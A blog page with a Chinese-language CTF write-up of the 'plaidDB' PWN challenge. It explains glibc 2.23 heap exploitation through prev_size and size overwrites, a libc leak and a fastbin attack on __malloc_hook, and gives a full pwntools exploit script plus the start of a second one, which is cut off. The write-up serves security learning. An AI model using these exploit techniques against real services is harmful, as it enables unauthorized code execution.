@@ -1,0 +1,917 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="A1ex">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/12/24/plaiddb/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="plaidDB">
+<meta property="og:url" content="http://example.com/2025/12/24/plaidDB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-12-24T02:59:16.000Z">
+<meta property="article:modified_time" content="2026-04-05T10:05:21.730Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            plaidDB | A1ex&#39;s blogs.
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to A1ex's security blogs.","subtitle":{"text":["Focus on IOT and reverse engineering"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":"蝴蝶","artist":"陶喆","url":"http://t4z2rakny.hn-bkt.clouddn.com/mp3/%E8%9D%B4%E8%9D%B6.mp3","cover":"https://i.ytimg.com/vi/1wkI80-fpPw/hqdefault.jpg","lrc":null},{"name":"歌谣","artist":"李荣浩","url":"http://t4z2rakny.hn-bkt.clouddn.com/mp3/%E6%AD%8C%E8%B0%A3.mp3","cover":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-pyZey8DKVpsr5qL5JDfPLOVcv6mDH3yVjQ&s","lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"FreeTalk":{"path":"/shuoshuo","icon":"fa-regular fa-chart-bar"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                A1ex&#39;s blogs.
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/shuoshuo"
+                                        >
+                                    <i class="fa-regular fa-chart-bar fa-fw"></i>
+                                    FREETALK
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/shuoshuo"
+                        >
+                            <span>
+                                FREETALK
+                            </span>
+                            
+                                <i class="fa-regular fa-chart-bar fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">6</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">23</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">plaidDB</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/avatar.png">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">A1ex</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-12-24 10:59:16</span>
+        <span class="mobile">2025-12-24 10:59:16</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-05 18:05:21</span>
+            <span class="mobile">2026-04-05 18:05:21</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>本题即可以通过修改prev_size来做，也可以通过修改size来做</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/damoxilai/p/15886839.html" >https://www.cnblogs.com/damoxilai/p/15886839.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><p>细节部分可以参考上述的文章</p>
+<p>这里对一些个人在实战中遇到的问题做一些解释</p>
+<blockquote>
+<p>1.为什么要连续申请又释放多个堆块？</p>
+<p>为了填满特定大小fastbin，因为这道题每使用一次put，会伴生申请结构体，会影响我门创建的连续的堆块，而通过这种连续申请又释放的方式，当我们正式利用的时候，申请的堆会在top下，然后伴生的结构体会从之前释放的fastbin中取得，就不会跟着我们申请的堆！可以自己挑事验证一下，这样我们在利用的时候申请1，2，3.他就是顺序排列的不会出现1，结构体，2，结构体这种情况</p>
+<p>2.大小是固定的吗，不是，但是如果你调整了大小需要相应的变更payload</p>
+<p>3.观察delete(‘a’ * 0x1f0 + p64(0x4e0))执行时会出现一个特殊的现象，就是明明已经释放了3，但是执行这个后3对应的堆变成正在使用了？</p>
+<p>这是因为本题的特殊性，当检测到长度不足时会进行扩容，而当我们写入1f0个a时，在unsorted bin中的3是符合大小的，所以会被detele中的sub_1040函数申请出来放，也就成了3又被使用了，并且我们覆盖了4的prev_size大小，当释放4的时候，将前面所有的堆块合并了，</p>
+<p>4.怎么泄漏的？</p>
+<p>我们释放4之后，一个大块被放在unsorted bin，当你再次申请的时候会从这个大块进行切割，与之对应的fd和bd会向后推，所以我们申请0x200后，它fd、bd刚好推到了2处，而2我们并没有释放，指针依然指向这个位置，所以能通过打印2获得内存泄漏</p>
+<p>5.payload是怎么构造的？</p>
+<p>我们获得泄漏地址后，通过覆盖fd指向malloc_hook，然后利用fastbin attack完成的</p>
+</blockquote>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./dataset_debug.elf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/opt/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">key</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;command:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;key:\n&#x27;</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27; byte&#x27;</span>, drop=<span class="literal">True</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put</span>(<span class="params">key, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;command:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;PUT&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;key:\n&#x27;</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;data:\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">        data = data.encode()</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 【关键修正】使用 b&#x27;\x00&#x27; 进行 bytes 填充</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) &lt; size:</span><br><span class="line">        io.send(data.ljust(size, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;command:\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;DEL&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;key:\n&#x27;</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    put(<span class="built_in">str</span>(i),<span class="number">0x38</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    delete(<span class="built_in">str</span>(i))</span><br><span class="line">   </span><br><span class="line">  put(<span class="string">&#x27;1&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  put(<span class="string">&#x27;2&#x27;</span>, <span class="number">0x50</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">  put(<span class="string">&#x27;5&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">  put(<span class="string">&#x27;3&#x27;</span>, <span class="number">0x1f8</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  put(<span class="string">&#x27;4&#x27;</span>, <span class="number">0xf0</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  put(<span class="string">&#x27;defense&#x27;</span>, <span class="number">0x40</span>, <span class="string">&#x27;defense-data&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line"></span><br><span class="line"> <span class="comment"># pause()</span></span><br><span class="line">  delete(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;delete 5&quot;</span>) </span><br><span class="line"> <span class="comment"># pause()</span></span><br><span class="line">  delete(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;delete 3&quot;</span>) </span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  delete(<span class="string">&#x27;1&#x27;</span>) </span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;delete 1&quot;</span>) </span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  delete(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>)) </span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;delete null&quot;</span>) </span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  delete(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;delete 4&quot;</span>) </span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  put(<span class="string">&#x27;0x200 fillup&#x27;</span>, <span class="number">0x200</span>, <span class="string">&#x27;fillup again&#x27;</span>)</span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  libc_leak = u64(get(<span class="string">&#x27;2&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">  info(<span class="string">&#x27;libc leak: 0x%x&#x27;</span> % libc_leak)</span><br><span class="line">  <span class="comment">#gdb.attach(io) </span></span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line">  libc_base = libc_leak - <span class="number">0x19cb78</span></span><br><span class="line">  info(<span class="string">&#x27;libc_base: 0x%x&#x27;</span> % libc_base) </span><br><span class="line">  put(<span class="string">&#x27;9&#x27;</span>, <span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">3</span>))</span><br><span class="line">  log.info(<span class="string">&quot;cover&quot;</span>) </span><br><span class="line">  <span class="comment">#pause()</span></span><br><span class="line"> </span><br><span class="line">  put(<span class="string">&#x27;prepare&#x27;</span>, <span class="number">0x68</span>, <span class="string">&#x27;prepare data&#x27;</span>)</span><br><span class="line">  log.info(<span class="string">&quot;prepare&quot;</span>) </span><br><span class="line"> <span class="comment"># pause()</span></span><br><span class="line">  one_gadget = libc_base + <span class="number">0x436e2</span></span><br><span class="line">  put(<span class="string">&#x27;attack&#x27;</span>, <span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line">  io.sendline(<span class="string">&#x27;DEL&#x27;</span>)</span><br><span class="line">  io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>方式2.</p>
+<p>前面的逻辑相同，不同思路是覆盖的是chunk 的size</p>
+<blockquote>
+<p>1.怎么个想法？</p>
+<p>利用3个chunk，将b释放后，通过a的写入，覆盖了b的大小低位覆盖0x00，覆盖后发生了错位，你观察heap就会发现，c不见了，此时，再切割b为b1，b2，释放b1，b1就是b的开始，当释放c的时候，因为c的prev_size是110，它向上找到的是b1，而b1未被使用，产生了合并。而b2指针仍在，所以，通过重新申请b1，使得内存fd刚好覆盖b2的fd，从而打印b2产生泄漏</p>
+</blockquote>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;, 10001)           </span></span><br><span class="line">io = process(<span class="string">&#x27;./dataset_debug.elf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/opt/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PUT</span>(<span class="params">key, size, data</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;command:&quot;</span>, <span class="string">&quot;PUT&quot;</span>)</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;key&quot;</span>, key)</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;size&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;data&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GET</span>(<span class="params">key</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&quot;command:&quot;</span>, <span 